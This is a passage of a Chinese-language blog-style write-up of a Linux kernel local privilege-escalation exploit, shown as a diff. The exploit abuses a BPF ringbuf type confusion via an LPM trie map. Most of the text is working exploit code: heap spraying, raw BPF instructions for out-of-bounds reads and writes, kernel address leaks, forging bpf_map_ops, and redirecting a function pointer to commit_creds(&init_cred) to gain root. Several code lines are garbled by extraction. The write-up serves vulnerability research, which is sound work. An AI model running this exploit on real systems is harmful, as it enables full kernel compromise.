@@ -1,0 +1,114 @@
+        int                        nr_pages;             /*    64     4 */
+        spinlock_t                 spinlock __attribute__((__aligned__(64))); /*   128     4 */
+        long unsigned int          consumer_pos __attribute__((__aligned__(4096))); /*  4096     8 */
+        long unsigned int          producer_pos __attribute__((__aligned__(4096))); /*  8192     8 */
+        char                       data[] __attribute__((__aligned__(4096))); /* 12288     0 */
+    } __attribute__((__aligned__(4096)));
+    struct lpm_trie_node {
+        struct callback_head       rcu __attribute__((__aligned__(8))); /*     0    16 */
+        struct lpm_trie_node *     child[2];             /*    16    16 */
+        u32                        prefixlen;            /*    32     4 */
+        u32                        flags;                /*    36     4 */
+        u8                         data[];               /*    40     0 */
+    } __attribute__((__aligned__(8)));
+## Exploit
+接下来便可以开始进行 exploit 了，流程大致如下
+  * 利用 `BPF_MAP_TYPE_LPM_TRIE` 进行 type confusion，并利用 `lpm_trie_node` 构造出 `bpf_ringbuf`
+  * 调整 `bpf_ringbuf` 的各个 field 用于 bypass 检查
+  * 在 `bpf program` 中呼叫 `bpf_ringbuf_reserve()` 并传入一个极大的 size 让其回传一个可以越界写的 array
+  * 透过 `heap spray bpf_array` 让任意一个 `bpf_array` 落在我们能够越界写的 buffer 后面
+  * 利用 buffer 越界读写 leak kernel address 以及写掉后方 `bpf_array` 的 `array_ops`
+  * 从所有拿来 spray 的 bpf map 当中找出哪个是我们越界写到的 `bpf_array`
+  * 最后套 `commit_creds(&init_cred)` 提权
+首先透过 `bpf_create_map()` 建立一个型别为 `BPF_MAP_TYPE_LPM_TRIE` 的 bpf map 用来进行 type
+confusion，并让他的 value_size 足够覆盖到整个 `struct bpf_ringbuf` (我选择的是 0x3000)，同时在前后
+spray 上多个 `bpf_array` 以利后续利用
+> 注意到一开始建立好 map 的时候，`struct lpm_trie_node *root` 会是 `NULL`，需要透过
+> `bpf_update_elem()` 去手动添加 node 才会帮他 allocate 一块空间
+    int i = 0;
+    /* heap spray */
+    for (; i  4+1
+    int vuln_mapfd = bpf_create_map(BPF_MAP_TYPE_LPM_TRIE, key_size, 0x3000, 1, BPF_F_NO_PREALLOC);
+    if (vuln_mapfd mask = 0xfffffffffffffffe;
+    rb->consumer_pos = 0;
+    rb->producer_pos = 0;
+    size_t key = 0; // index 0 (root node)
+    int ret = bpf_update_elem(vuln_mapfd, &key, data, 0);
+    if (ret  rb->mask + 1)
+        return NULL;
+  * ringbuf 剩余空间检查
+    if (new_prod_pos - cons_pos > rb->mask) {
+        spin_unlock_irqrestore(&rb->spinlock, flags);
+        return NULL;
+    }
+接著是 bpf program 的部分，
+首先传入刚刚建立好用于 type confusion 的 bpf map fd，设定 size 为一个极大值 `(0x3fffffff)`，并呼叫
+`bpf_ringbuf_reserve()` 让他回传一个能在 bpf program 当中越界读写的 heap address
+    BPF_LD_MAP_FD(BPF_REG_1, vuln_mapfd),
+    BPF_MOV64_IMM(BPF_REG_2, 0x3fffffff),
+    BPF_MOV64_IMM(BPF_REG_3, 0x0),
+    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), /* must check NULL case */
+    BPF_EXIT_INSN(),
+透过越界读写从下一个 `bpf_array` leak kernel base / heap 地址
+    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),
+    /* get neighbor bpf_array address */
+    BPF_MOV64_REG(BPF_REG_4, BPF_REG_8),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 0x4000 - 0x3008),
+    /* get buffer address */
+    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_4, 0xc0),
+    BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, 0xc0 + 0x4000 - 0x3008),
+    /* get kernel base */
+    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_4, 0),
+    BPF_ALU64_IMM(BPF_SUB, BPF_REG_7, array_map_ops_off),
+在 buffer 上伪造 `bpf_map_ops`，并将 `bpf_array.map.ops` 写掉改成指向他，再来便可以透过替换其中的两个
+function 来达成 `commit_creds(&init_cred);`
+  * `.map_delete_elem = fd_array_map_delete_elem`
+  * `.map_fd_put_ptr = commit_creds` 详情请见 [ZDI-20-1440-writeup](https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#smap "ZDI-20-1440-writeup")
+> 这里有额外还原一个 `array_map_lookup_elem()` 到伪造的 `bpf_map_ops` 上
+    /* put &init_cred onto bpf_array.value[0] */
+    BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, init_cred_off),
+    BPF_STX_MEM(BPF_DW, BPF_REG_4, BPF_REG_1, 0x110),
+    /* overwrite bpf_array.map.ops = buffer */
+    BPF_STX_MEM(BPF_DW, BPF_REG_4, BPF_REG_6, 0),
+    /* construct fake array_ops on buffer */
+    /* put array_map_lookup_elem back since we need to use it later */
+    BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, array_map_lookup_elem_off),
+    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0x58),
+    BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, fd_array_map_delete_elem_off),
+    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0x68),
+    BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, commit_creds_off),
+    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0x90),
+由于 verifier 要求要将 bpf program 要到的资源释放掉，我们需要额外呼叫
+[bpf_ringbuf_discard()](https://elixir.bootlin.com/linux/v5.13.13/source/kernel/bpf/ringbuf.c#L411
+"bpf_ringbuf_discard\(\)") 来让他闭嘴，参数给 `BPF_RB_NO_WAKEUP` 是为了回避
+`bpf_ringbuf_discard()` 里的 `irq_work_queue()`
+    /* release resources to make verifier happy */
+    BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),
+    BPF_MOV64_IMM(BPF_REG_2, BPF_RB_NO_WAKEUP),
+    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),
+    BPF_MOV64_IMM(BPF_REG_0, 0x0),
+    BPF_EXIT_INSN(),
+在触发 bpf program 执行以后，透过 `bpf_lookup_elem()` 检查哪个 `bpf_array` 有被我们改过
+    for (int i = 0; i < ARRAY_SIZE(ctrl_mapfds); ++i) {
+      memset(testbuf, 0, sizeof(testbuf));
+      key = 0;
+      if (bpf_lookup_elem(ctrl_mapfds[i], &key, testbuf)) {
+        printf("[-] failed to lookup bpf map on idx %d\n", i);
+      }
+      if (testbuf[0]) {
+        printf("[*] found vulnerable mapfd %d\n", ctrl_mapfds[i]);
+        return ctrl_mapfds[i];
+      }
+    }
+最后呼叫 `bpf_delete_elem()` 便可以触发 `commit_creds(&init_cred)` 提权
+## 写在最后
+很可惜的，由于 exploit 当中使用到 `BPF_MAP_TYPE_LPM_TRIE` 这个 map type，他需要 process 至少拥有
+`CAP_BPF`的权限才能够执行，但根据在 lwn.net 上 [Introduce
+CAP_BPF](https://lwn.net/Articles/820560/ "Introduce CAP_BPF")
+这篇文章的解释，这个权限应该还算蛮小的，不过我还是很好奇有没有其他做法
+* * *
